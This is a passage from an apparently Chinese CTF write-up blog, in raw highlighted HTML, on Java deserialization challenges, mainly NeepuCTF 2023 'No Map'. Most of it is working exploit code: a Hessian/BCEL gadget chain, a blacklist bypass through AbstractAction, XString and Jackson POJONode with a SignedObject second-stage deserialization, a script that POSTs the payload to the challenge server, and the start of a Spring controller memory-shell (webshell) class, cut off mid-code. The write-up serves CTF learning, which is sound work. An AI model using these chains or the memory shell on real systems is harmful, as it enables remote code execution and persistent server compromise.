class="hljs-literal">[]</span> args) throws Exception &#123;        PKCS9Attributes s = create<span class="hljs-constructor">WithoutConstructor(PKCS9Attributes.<span class="hljs-params">class</span>)</span>;        UIDefaults uiDefaults = <span class="hljs-keyword">new</span> <span class="hljs-constructor">UIDefaults()</span>;        JavaClass evil = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Repository</span>.</span></span>lookup<span class="hljs-constructor">Class(Evil.<span class="hljs-params">class</span>)</span>;        String payload = <span class="hljs-string">&quot;$$BCEL$$&quot;</span> + <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Utility</span>.</span></span>encode(evil.get<span class="hljs-constructor">Bytes()</span>, <span class="hljs-literal">true</span>);        uiDefaults.put(PKCS9Attribute.EMAIL_ADDRESS_OID, <span class="hljs-keyword">new</span> <span class="hljs-constructor">SwingLazyValue(<span class="hljs-string">&quot;com.sun.org.apache.bcel.internal.util.JavaWrapper&quot;</span>, <span class="hljs-string">&quot;_main&quot;</span>, <span class="hljs-params">new</span> Object[]&#123;<span class="hljs-params">new</span> String[]&#123;<span class="hljs-params">payload</span>&#125;&#125;)</span>);        set<span class="hljs-constructor">FieldValue(<span class="hljs-params">s</span>,<span class="hljs-string">&quot;attributes&quot;</span>,<span class="hljs-params">uiDefaults</span>)</span>;        ByteArrayOutputStream baos = <span class="hljs-keyword">new</span> <span class="hljs-constructor">ByteArrayOutputStream()</span>;        Hessian2Output out = <span class="hljs-keyword">new</span> <span class="hljs-constructor">Hessian2Output(<span class="hljs-params">baos</span>)</span>;        baos.write(<span class="hljs-number">67</span>);        out.get<span class="hljs-constructor">SerializerFactory()</span>.set<span class="hljs-constructor">AllowNonSerializable(<span class="hljs-params">true</span>)</span>;        out.write<span class="hljs-constructor">Object(<span class="hljs-params">s</span>)</span>;        out.flush<span class="hljs-constructor">Buffer()</span>;        String base64Str = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Base64</span>.</span></span>get<span class="hljs-constructor">Encoder()</span>.encode<span class="hljs-constructor">ToString(<span class="hljs-params">baos</span>.<span class="hljs-params">toByteArray</span>()</span>);        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">System</span>.</span></span>out.println(base64Str);        ByteArrayInputStream bais = <span class="hljs-keyword">new</span> <span class="hljs-constructor">ByteArrayInputStream(Base64.<span class="hljs-params">getDecoder</span>()</span>.decode(base64Str));        Hessian2Input input = <span class="hljs-keyword">new</span> <span class="hljs-constructor">Hessian2Input(<span class="hljs-params">bais</span>)</span>;        input.read<span class="hljs-constructor">Object()</span>;    &#125;    public static &lt;T&gt; T create<span class="hljs-constructor">WithoutConstructor(Class&lt;T&gt; <span class="hljs-params">classToInstantiate</span>)</span> throws NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException &#123;        return create<span class="hljs-constructor">WithConstructor(<span class="hljs-params">classToInstantiate</span>, Object.<span class="hljs-params">class</span>, <span class="hljs-params">new</span> Class[0], <span class="hljs-params">new</span> Object[0])</span>;    &#125;    public static &lt;T&gt; T create<span class="hljs-constructor">WithConstructor(Class&lt;T&gt; <span class="hljs-params">classToInstantiate</span>, Class&lt;? <span class="hljs-params">super</span> T&gt; <span class="hljs-params">constructorClass</span>, Class&lt;?&gt;[] <span class="hljs-params">consArgTypes</span>, Object[] <span class="hljs-params">consArgs</span>)</span> throws NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException &#123;        Constructor&lt;? super T&gt; objCons = constructorClass.get<span class="hljs-constructor">DeclaredConstructor(<span class="hljs-params">consArgTypes</span>)</span>;        objCons.set<span class="hljs-constructor">Accessible(<span class="hljs-params">true</span>)</span>;        Constructor&lt;?&gt; sc = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ReflectionFactory</span>.</span></span>get<span class="hljs-constructor">ReflectionFactory()</span>.<span class="hljs-keyword">new</span><span class="hljs-constructor">ConstructorForSerialization(<span class="hljs-params">classToInstantiate</span>, <span class="hljs-params">objCons</span>)</span>;        sc.set<span class="hljs-constructor">Accessible(<span class="hljs-params">true</span>)</span>;        return (T) sc.<span class="hljs-keyword">new</span><span class="hljs-constructor">Instance(<span class="hljs-params">consArgs</span>)</span>;    &#125;    public static void set<span class="hljs-constructor">FieldValue(Object <span class="hljs-params">obj</span>, String <span class="hljs-params">fieldName</span>, Object <span class="hljs-params">value</span>)</span> throws Exception &#123;        Field field = obj.get<span class="hljs-constructor">Class()</span>.get<span class="hljs-constructor">DeclaredField(<span class="hljs-params">fieldName</span>)</span>;        field.set<span class="hljs-constructor">Accessible(<span class="hljs-params">true</span>)</span>;        field.set(obj, value);    &#125;&#125;</code></pre></div><p>成不了一点</p><h2 id="NeepuCTF-2023-No-Map"><a href="#NeepuCTF-2023-No-Map" class="headerlink" title="NeepuCTF 2023    No Map"></a>NeepuCTF 2023    No Map</h2><p>boogipop大佬说<strong>这道题的话假如出题人不去掉rasp的话他是出不来了</strong></p><p>搞不懂，直接看吧</p><p>看依赖直接是jackson反序列化</p><p><img src="/../images/%E6%8F%90%E5%8F%8Arasp%E7%9A%84java%E9%A2%98/image-20231116172916127.png" alt="image-20231116172916127"></p><div class="code-wrapper"><pre><code class="hljs arduino"><span class="hljs-keyword">private</span> <span class="hljs-type">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span>[] blacklist = <span class="hljs-keyword">new</span> <span class="hljs-type">String</span>[]&#123;<span class="hljs-string">&quot;bsh&quot;</span>, <span class="hljs-string">&quot;clojure&quot;</span>, <span class="hljs-string">&quot;java.util&quot;</span>, <span class="hljs-string">&quot;javax.management&quot;</span>, <span class="hljs-string">&quot;java.rmi&quot;</span>, <span class="hljs-string">&quot;com.sun.jndi&quot;</span>, <span class="hljs-string">&quot;sun.rmi&quot;</span>, <span class="hljs-string">&quot;org.apache&quot;</span>, <span class="hljs-string">&quot;org.hibernate&quot;</span>, <span class="hljs-string">&quot;org.springframework&quot;</span>, <span class="hljs-string">&quot;com.mchange.v2.c3p0&quot;</span>, <span class="hljs-string">&quot;com.rometools.rome.feed.impl&quot;</span>, <span class="hljs-string">&quot;com.alibaba.fastjson&quot;</span>, <span class="hljs-string">&quot;java.net.URL&quot;</span>, <span class="hljs-string">&quot;java.lang.reflect.Proxy&quot;</span>, <span class="hljs-string">&quot;javax.xml.transform.Templates&quot;</span>, <span class="hljs-string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>, <span class="hljs-string">&quot;org.apache.xalan.xsltc.trax.TemplatesImpl&quot;</span>, <span class="hljs-string">&quot;org.python.core&quot;</span>, <span class="hljs-string">&quot;com.mysql.jdbc&quot;</span>, <span class="hljs-string">&quot;org.jboss&quot;</span>&#125;;</code></pre></div><p><code>java.util</code>相当于禁用<code>HashMap</code></p><p><code>javax.management</code>禁用<code>BadAttributeValueExpException</code></p><p>禁用了<code>TemplatesImpl</code>使用二次反序列化绕过</p><p>要自己找一条从readObject到toString的链子</p><p>Boogipop只说经过查找，根本不会查找啊（呜呜呜）</p><p>另一边看别人用工具</p><p><img src="/../images/%E6%8F%90%E5%8F%8Arasp%E7%9A%84java%E9%A2%98/image-20231116173432061.png" alt="image-20231116173432061"></p><p>都是我没有的东西</p><p>最终找到<code>javax.swing.AbstractAction</code></p><p>分析</p><div class="code-wrapper"><pre><code class="hljs xl"><span class="hljs-function"><span class="hljs-title">readObject</span> -&gt;</span> <span class="hljs-function"><span class="hljs-title">putValue</span> -&gt;</span>firePropertyChange</code></pre></div><p><img src="/../images/%E6%8F%90%E5%8F%8Arasp%E7%9A%84java%E9%A2%98/image-20231116175433258.png" alt="image-20231116175433258"></p><p>可以用Xstring的equals</p><p><code>writeObject</code>有个<code>writeArrayTable</code>方法</p><p>序列化的时候执行<code>ArrayTable.writeArrayTable(s, arrayTable);</code>导致我们写不进两个key相同value不同的ArrayTable</p><p><img src="/../images/%E6%8F%90%E5%8F%8Arasp%E7%9A%84java%E9%A2%98/image-20231116180610346.png" alt="image-20231116180610346"></p><p>这里就需要我们重写<code>writeArrayTable</code>方法</p><p><img src="/../images/%E6%8F%90%E5%8F%8Arasp%E7%9A%84java%E9%A2%98/image-20231129163804262.png" alt="image-20231129163804262"></p><div class="code-wrapper"><pre><code class="hljs reasonml">package org.example;import com.fasterxml.jackson.databind.node.POJONode;import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;import com.sun.org.apache.xpath.internal.objects.XString;import javassist.ClassMap;import javassist.ClassPool;import javassist.CtClass;import javassist.CtConstructor;import org.springframework.aop.target.HotSwappableTargetSource;import org.springframework.http.HttpEntity;import org.springframework.http.HttpHeaders;import org.springframework.http.ResponseEntity;import org.springframework.web.client.RestTemplate;import sun.reflect.ReflectionFactory;import javax.management.BadAttributeValueExpException;import javax.swing.*;import javax.swing.event.SwingPropertyChangeSupport;import javax.swing.text.StyledEditorKit;import javax.xml.transform.Templates;import java.io.*;import java.lang.reflect.Array;import java.lang.reflect.Constructor;import java.lang.reflect.Field;import java.lang.reflect.InvocationTargetException;import java.net.URI;import java.nio.file.Files;import java.nio.file.Paths;import java.security.*;import java.util.Base64;import java.util.HashMap;public <span class="hljs-keyword">class</span> TemplatesImplChain &#123;    public static void main(String<span class="hljs-literal">[]</span> args) throws Exception &#123;        byte<span class="hljs-literal">[]</span> code= <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Files</span>.</span></span>read<span class="hljs-constructor">AllBytes(Paths.<span class="hljs-params">get</span>(<span class="hljs-string">&quot;E:\\CTFLearning\\JackSonPOJO\\target\\classes\\org\\example\\InjectToController.class&quot;</span>)</span>);        byte<span class="hljs-literal">[]</span><span class="hljs-literal">[]</span> codes=&#123;code&#125;;        TemplatesImpl templatesImpl = <span class="hljs-keyword">new</span> <span class="hljs-constructor">TemplatesImpl()</span>;        set<span class="hljs-constructor">FieldValue(<span class="hljs-params">templatesImpl</span>, <span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-params">codes</span>)</span>;        set<span class="hljs-constructor">FieldValue(<span class="hljs-params">templatesImpl</span>, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;boogipop&quot;</span>)</span>;        set<span class="hljs-constructor">FieldValue(<span class="hljs-params">templatesImpl</span>, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-params">null</span>)</span>;        POJONode jsonNodes2 = <span class="hljs-keyword">new</span> <span class="hljs-constructor">POJONode(<span class="hljs-params">templatesImpl</span>)</span>;        BadAttributeValueExpException exp2 = <span class="hljs-keyword">new</span> <span class="hljs-constructor">BadAttributeValueExpException(<span class="hljs-params">null</span>)</span>;        Field val2 = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Class</span>.</span></span><span class="hljs-keyword">for</span><span class="hljs-constructor">Name(<span class="hljs-string">&quot;javax.management.BadAttributeValueExpException&quot;</span>)</span>.get<span class="hljs-constructor">DeclaredField(<span class="hljs-string">&quot;val&quot;</span>)</span>;        val2.set<span class="hljs-constructor">Accessible(<span class="hljs-params">true</span>)</span>;        val2.set(exp2,jsonNodes2);                KeyPairGenerator keyPairGenerator;        keyPairGenerator = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">KeyPairGenerator</span>.</span></span>get<span class="hljs-constructor">Instance(<span class="hljs-string">&quot;DSA&quot;</span>)</span>;        keyPairGenerator.initialize(<span class="hljs-number">1024</span>);        KeyPair keyPair = keyPairGenerator.gen<span class="hljs-constructor">KeyPair()</span>;        PrivateKey privateKey = keyPair.get<span class="hljs-constructor">Private()</span>;        Signature signingEngine = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Signature</span>.</span></span>get<span class="hljs-constructor">Instance(<span class="hljs-string">&quot;DSA&quot;</span>)</span>;        SignedObject signedObject = <span class="hljs-keyword">new</span> <span class="hljs-constructor">SignedObject(<span class="hljs-params">exp2</span>,<span class="hljs-params">privateKey</span>,<span class="hljs-params">signingEngine</span>)</span>;                POJONode jsonNodes = <span class="hljs-keyword">new</span> <span class="hljs-constructor">POJONode(<span class="hljs-params">signedObject</span>)</span>;        XString xString = <span class="hljs-keyword">new</span> <span class="hljs-constructor">XString(<span class="hljs-string">&quot;111&quot;</span>)</span>;        SwingPropertyChangeSupport swingPropertyChangeSupport = <span class="hljs-keyword">new</span> <span class="hljs-constructor">SwingPropertyChangeSupport(<span class="hljs-string">&quot;11&quot;</span>)</span>;        StyledEditorKit.AlignmentAction alignmentAction = <span class="hljs-keyword">new</span> StyledEditorKit.<span class="hljs-constructor">AlignmentAction(<span class="hljs-string">&quot;111&quot;</span>,1)</span>;        Field field = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Class</span>.</span></span><span class="hljs-keyword">for</span><span class="hljs-constructor">Name(<span class="hljs-string">&quot;javax.swing.AbstractAction&quot;</span>)</span>.get<span class="hljs-constructor">DeclaredField(<span class="hljs-string">&quot;changeSupport&quot;</span>)</span>;        field.set<span class="hljs-constructor">Accessible(<span class="hljs-params">true</span>)</span>;        field.set(alignmentAction,swingPropertyChangeSupport);        alignmentAction.put<span class="hljs-constructor">Value(<span class="hljs-string">&quot;11&quot;</span>,<span class="hljs-params">xString</span>)</span>;        alignmentAction.put<span class="hljs-constructor">Value(<span class="hljs-string">&quot;12&quot;</span>,<span class="hljs-params">jsonNodes</span>)</span>;        <span class="hljs-comment">//deserial(serial(alignmentAction));</span>        ByteArrayOutputStream barr = <span class="hljs-keyword">new</span> <span class="hljs-constructor">ByteArrayOutputStream()</span>;        ObjectOutputStream objectOutputStream = <span class="hljs-keyword">new</span> <span class="hljs-constructor">ObjectOutputStream(<span class="hljs-params">barr</span>)</span>;        objectOutputStream.write<span class="hljs-constructor">UTF(<span class="hljs-string">&quot;NEEPU&quot;</span>)</span>;        objectOutputStream.write<span class="hljs-constructor">Int(1949)</span>;        objectOutputStream.write<span class="hljs-constructor">Object(<span class="hljs-params">alignmentAction</span>)</span>;        FileOutputStream fout=<span class="hljs-keyword">new</span> <span class="hljs-constructor">FileOutputStream(<span class="hljs-string">&quot;1.ser&quot;</span>)</span>;        fout.write(barr.<span class="hljs-keyword">to</span><span class="hljs-constructor">ByteArray()</span>);        fout.close<span class="hljs-literal">()</span>;        FileInputStream fileInputStream = <span class="hljs-keyword">new</span> <span class="hljs-constructor">FileInputStream(<span class="hljs-string">&quot;1.ser&quot;</span>)</span>;        <span class="hljs-comment">//System.out.println(serial(exp));</span>        <span class="hljs-comment">//deserial(serial(map));</span>        <span class="hljs-comment">//doPOST(exp.toString().getBytes());</span>        byte<span class="hljs-literal">[]</span> byt=<span class="hljs-keyword">new</span> byte<span class="hljs-literal">[<span class="hljs-identifier">fileInputStream</span>.<span class="hljs-identifier">available</span>()]</span>;        fileInputStream.read(byt);        <span class="hljs-keyword">do</span><span class="hljs-constructor">POST(<span class="hljs-params">byt</span>)</span>;    &#125;    public static HashMap&lt;Object, Object&gt; makeMap ( Object v1, Object v2 ) throws Exception &#123;        HashMap&lt;Object, Object&gt; s = <span class="hljs-keyword">new</span> HashMap&lt;&gt;<span class="hljs-literal">()</span>;        set<span class="hljs-constructor">FieldValue(<span class="hljs-params">s</span>, <span class="hljs-string">&quot;size&quot;</span>, 2)</span>;        Class&lt;?&gt; nodeC;        <span class="hljs-keyword">try</span> &#123;            nodeC = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Class</span>.</span></span><span class="hljs-keyword">for</span><span class="hljs-constructor">Name(<span class="hljs-string">&quot;java.util.HashMap$Node&quot;</span>)</span>;        &#125;        catch ( ClassNotFoundException e ) &#123;            nodeC = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Class</span>.</span></span><span class="hljs-keyword">for</span><span class="hljs-constructor">Name(<span class="hljs-string">&quot;java.util.HashMap$Entry&quot;</span>)</span>;        &#125;        Constructor&lt;?&gt; nodeCons = nodeC.get<span class="hljs-constructor">DeclaredConstructor(<span class="hljs-params">int</span>.<span class="hljs-params">class</span>, Object.<span class="hljs-params">class</span>, Object.<span class="hljs-params">class</span>, <span class="hljs-params">nodeC</span>)</span>;        nodeCons.set<span class="hljs-constructor">Accessible(<span class="hljs-params">true</span>)</span>;        Object tbl = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Array</span>.</span></span><span class="hljs-keyword">new</span><span class="hljs-constructor">Instance(<span class="hljs-params">nodeC</span>, 2)</span>;        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Array</span>.</span></span>set(tbl, <span class="hljs-number">0</span>, nodeCons.<span class="hljs-keyword">new</span><span class="hljs-constructor">Instance(0, <span class="hljs-params">v1</span>, <span class="hljs-params">v1</span>, <span class="hljs-params">null</span>)</span>);        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Array</span>.</span></span>set(tbl, <span class="hljs-number">1</span>, nodeCons.<span class="hljs-keyword">new</span><span class="hljs-constructor">Instance(0, <span class="hljs-params">v2</span>, <span class="hljs-params">v2</span>, <span class="hljs-params">null</span>)</span>);        set<span class="hljs-constructor">FieldValue(<span class="hljs-params">s</span>, <span class="hljs-string">&quot;table&quot;</span>, <span class="hljs-params">tbl</span>)</span>;        return s;    &#125;    public static void <span class="hljs-keyword">do</span><span class="hljs-constructor">POST(<span class="hljs-params">byte</span>[] <span class="hljs-params">obj</span>)</span> throws Exception&#123;        HttpHeaders requestHeaders = <span class="hljs-keyword">new</span> <span class="hljs-constructor">HttpHeaders()</span>;        requestHeaders.set(<span class="hljs-string">&quot;Content-Type&quot;</span>, <span class="hljs-string">&quot;text/plain&quot;</span>);        URI url = <span class="hljs-keyword">new</span> <span class="hljs-constructor">URI(<span class="hljs-string">&quot;http://neepusec.fun:27010/nomap&quot;</span>)</span>;        <span class="hljs-comment">//URI url = new URI(&quot;http://localhost:8090/nomap&quot;);</span>        <span class="hljs-comment">//URI url = new URI(&quot;http://localhost:8080/bypassit&quot;);</span>        HttpEntity&lt;byte<span class="hljs-literal">[]</span>&gt; requestEntity = <span class="hljs-keyword">new</span> HttpEntity &lt;&gt; (obj,requestHeaders);        RestTemplate restTemplate = <span class="hljs-keyword">new</span> <span class="hljs-constructor">RestTemplate()</span>;        ResponseEntity&lt;String&gt; res = restTemplate.post<span class="hljs-constructor">ForEntity(<span class="hljs-params">url</span>, <span class="hljs-params">requestEntity</span>, String.<span class="hljs-params">class</span>)</span>;        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">System</span>.</span></span>out.println(res.get<span class="hljs-constructor">Body()</span>);    &#125;    public static String serial(Object o) throws IOException, NoSuchFieldException &#123;        ByteArrayOutputStream baos = <span class="hljs-keyword">new</span> <span class="hljs-constructor">ByteArrayOutputStream()</span>;        ObjectOutputStream oos = <span class="hljs-keyword">new</span> <span class="hljs-constructor">ObjectOutputStream(<span class="hljs-params">baos</span>)</span>;        <span class="hljs-comment">//Field writeReplaceMethod = ObjectStreamClass.class.getDeclaredField(&quot;writeReplaceMethod&quot;);</span>        <span class="hljs-comment">//writeReplaceMethod.setAccessible(true);</span>        oos.write<span class="hljs-constructor">Int(1949)</span>;        oos.write<span class="hljs-constructor">UTF(<span class="hljs-string">&quot;NEEPU&quot;</span>)</span>;        oos.write<span class="hljs-constructor">Object(<span class="hljs-params">o</span>)</span>;        oos.close<span class="hljs-literal">()</span>;        String base64String = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Base64</span>.</span></span>get<span class="hljs-constructor">Encoder()</span>.encode<span class="hljs-constructor">ToString(<span class="hljs-params">baos</span>.<span class="hljs-params">toByteArray</span>()</span>);        return base64String;    &#125;    public static void deserial(String data) throws Exception &#123;        byte<span class="hljs-literal">[]</span> base64decodedBytes = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Base64</span>.</span></span>get<span class="hljs-constructor">Decoder()</span>.decode(data);        ByteArrayInputStream bais = <span class="hljs-keyword">new</span> <span class="hljs-constructor">ByteArrayInputStream(<span class="hljs-params">base64decodedBytes</span>)</span>;        ObjectInputStream ois = <span class="hljs-keyword">new</span> <span class="hljs-constructor">ObjectInputStream(<span class="hljs-params">bais</span>)</span>;        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">System</span>.</span></span>out.println(ois.read<span class="hljs-constructor">Int()</span>);        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">System</span>.</span></span>out.println(ois.read<span class="hljs-constructor">UTF()</span>);        ois.read<span class="hljs-constructor">Object()</span>;        ois.close<span class="hljs-literal">()</span>;    &#125;    <span class="hljs-keyword">private</span> static void <span class="hljs-constructor">Base64Encode(ByteArrayOutputStream <span class="hljs-params">bs</span>)</span>&#123;        byte<span class="hljs-literal">[]</span> encode = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Base64</span>.</span></span>get<span class="hljs-constructor">Encoder()</span>.encode(bs.<span class="hljs-keyword">to</span><span class="hljs-constructor">ByteArray()</span>);        String s = <span class="hljs-keyword">new</span> <span class="hljs-constructor">String(<span class="hljs-params">encode</span>)</span>;        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">System</span>.</span></span>out.println(s);        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">System</span>.</span></span>out.println(s.length<span class="hljs-literal">()</span>);    &#125;    <span class="hljs-keyword">private</span> static void set<span class="hljs-constructor">FieldValue(Object <span class="hljs-params">obj</span>, String <span class="hljs-params">field</span>, Object <span class="hljs-params">arg</span>)</span> throws Exception&#123;        Field f = obj.get<span class="hljs-constructor">Class()</span>.get<span class="hljs-constructor">DeclaredField(<span class="hljs-params">field</span>)</span>;        f.set<span class="hljs-constructor">Accessible(<span class="hljs-params">true</span>)</span>;        f.set(obj, arg);    &#125;    public static String unhash ( <span class="hljs-built_in">int</span> hash ) &#123;        <span class="hljs-built_in">int</span> target = hash;        StringBuilder answer = <span class="hljs-keyword">new</span> <span class="hljs-constructor">StringBuilder()</span>;        <span class="hljs-keyword">if</span> ( target &lt; <span class="hljs-number">0</span> ) &#123;            <span class="hljs-comment">// String with hash of Integer.MIN_VALUE, 0x80000000</span>            answer.append(<span class="hljs-string">&quot;\\u0915\\u0009\\u001e\\u000c\\u0002&quot;</span>);            <span class="hljs-keyword">if</span> ( target<span class="hljs-operator"> == </span>Integer.MIN_VALUE )                return answer.<span class="hljs-keyword">to</span><span class="hljs-constructor">String()</span>;            <span class="hljs-comment">// Find target without sign bit set</span>            target = target &amp; Integer.MAX_VALUE;        &#125;        unhash0(answer, target);        return answer.<span class="hljs-keyword">to</span><span class="hljs-constructor">String()</span>;    &#125;    <span class="hljs-keyword">private</span> static void unhash0 ( StringBuilder partial, <span class="hljs-built_in">int</span> target ) &#123;        <span class="hljs-built_in">int</span> div = target<span class="hljs-operator"> / </span><span class="hljs-number">31</span>;        <span class="hljs-built_in">int</span> rem = target % <span class="hljs-number">31</span>;        <span class="hljs-keyword">if</span> ( div &lt;= Character.MAX_VALUE ) &#123;            <span class="hljs-keyword">if</span> ( div != <span class="hljs-number">0</span> )                partial.append((<span class="hljs-built_in">char</span>) div);            partial.append((<span class="hljs-built_in">char</span>) rem);        &#125;        <span class="hljs-keyword">else</span> &#123;            unhash0(partial, div);            partial.append((<span class="hljs-built_in">char</span>) rem);        &#125;    &#125;    public static &lt;T&gt; T create<span class="hljs-constructor">WithoutConstructor(Class&lt;T&gt; <span class="hljs-params">classToInstantiate</span>)</span> throws NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException &#123;        return create<span class="hljs-constructor">WithConstructor(<span class="hljs-params">classToInstantiate</span>, Object.<span class="hljs-params">class</span>, <span class="hljs-params">new</span> Class[0], <span class="hljs-params">new</span> Object[0])</span>;    &#125;    public static &lt;T&gt; T create<span class="hljs-constructor">WithConstructor(Class&lt;T&gt; <span class="hljs-params">classToInstantiate</span>, Class&lt;? <span class="hljs-params">super</span> T&gt; <span class="hljs-params">constructorClass</span>, Class&lt;?&gt;[] <span class="hljs-params">consArgTypes</span>, Object[] <span class="hljs-params">consArgs</span>)</span> throws NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException, InvocationTargetException &#123;        Constructor&lt;? super T&gt; objCons = constructorClass.get<span class="hljs-constructor">DeclaredConstructor(<span class="hljs-params">consArgTypes</span>)</span>;        objCons.set<span class="hljs-constructor">Accessible(<span class="hljs-params">true</span>)</span>;        Constructor&lt;?&gt; sc = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ReflectionFactory</span>.</span></span>get<span class="hljs-constructor">ReflectionFactory()</span>.<span class="hljs-keyword">new</span><span class="hljs-constructor">ConstructorForSerialization(<span class="hljs-params">classToInstantiate</span>, <span class="hljs-params">objCons</span>)</span>;        sc.set<span class="hljs-constructor">Accessible(<span class="hljs-params">true</span>)</span>;        return (T) sc.<span class="hljs-keyword">new</span><span class="hljs-constructor">Instance(<span class="hljs-params">consArgs</span>)</span>;    &#125;&#125;</code></pre></div><p>内存马</p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example;<span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;<span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;<span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;<span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;<span class="hljs-keyword">import</span> org.springframework.web.context.WebApplicationContext;<span class="hljs-keyword">import</span> org.springframework.web.context.request.RequestContextHolder;<span class="hljs-keyword">import</span> org.springframework.web.context.request.ServletRequestAttributes;<span class="hljs-keyword">import</span> org.springframework.web.servlet.mvc.condition.PatternsRequestCondition;<span class="hljs-keyword">import</span> org.springframework.web.servlet.mvc.condition.RequestMethodsRequestCondition;<span class="hljs-keyword">import</span> org.springframework.web.servlet.mvc.method.RequestMappingInfo;<span class="hljs-keyword">import</span> org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;<span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;<span class="hljs-keyword">import</span> javax.servlet.http.HttpServletResponse;<span class="hljs-keyword">import</span> java.io.IOException;<span class="hljs-keyword">import</span> java.io.PrintWriter;<span class="hljs-keyword">import</span> java.lang.reflect.Field;<span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<span class="hljs-keyword">import</span> java.lang.reflect.Method;<span class="hljs-keyword">import</span> java.lang.reflect.Modifier;<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">InjectToController</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractTranslet</span> &#123;    <span class="hljs-comment">// 第一个构造函数</span>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">InjectToController</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, IllegalAccessException, NoSuchMethodException, NoSuchFieldException, InvocationTargetException, InstantiationException &#123;        <span class="hljs-type">WebApplicationContext</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute(<span class="hljs-string">&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;</span>, <span class="hljs-number">0</span>);        <span class="hljs-comment">// 1. 从当前上下文环境中获得 RequestMappingHandlerMapping 的实例 bean</span>        <span class="hljs-type">RequestMappingHandlerMapping</span> <span class="hljs-variable">mappingHandlerMapping</span> <span class="hljs-operator">=</span> context.getBean(RequestMappingHandlerMapping.class);        <span class="hljs-type">Field</span> <span class="hljs-variable">configField</span> <span class="hljs-operator">=</span> mappingHandlerMapping.getClass().getDeclaredField(<span class="hljs-string">&quot;config&quot;</span>);        configField.setAccessible(<span class="hljs-literal">true</span>);        RequestMappingInfo.<span class="hljs-type">BuilderConfiguration</span> <span class="hljs-variable">config</span> <span class="hljs-operator">=</span>(RequestMappingInfo.BuilderConfiguration) configField.get(mappingHandlerMapping);        <span class="hljs-type">Method</span> <span class="hljs-variable">method2</span> <span class="hljs-operator">=</span> InjectToController.class.getMethod(<span class="hljs-string">&quot;test&quot;</span>);        <span class="hljs-type">RequestMethodsRequestCondition</span> <span class="hljs-variable">ms</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RequestMethodsRequestCondition</span>();        <span class="hljs-type">RequestMappingInfo</span> <span class="hljs-variable">info</span> <span class="hljs-operator">=</span> RequestMappingInfo.paths(<span class="hljs-string">&quot;/Flag&quot;</span>)                .options(config)                .build();        <span class="hljs-type">InjectToController</span> <span class="hljs-variable">springControllerMemShell</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InjectToController</span>(<span class="hljs-string">&quot;aaa&quot;</span>);        mappingHandlerMapping.registerMapping(info, springControllerMemShell, method2);    &#125;    <span class="hljs-meta">@Override</span>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, SerializationHandler[] handlers)</span> <span class="hljs-keyword">throws</span> TransletException &#123;    &#125;    <span class="hljs-meta">@Override</span>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="hljs-keyword">throws</span> TransletException &#123;    &#125;    <span class="hljs-comment">// 第二个构造函数</span>    <span class="hljs-keyword">public</span> <span 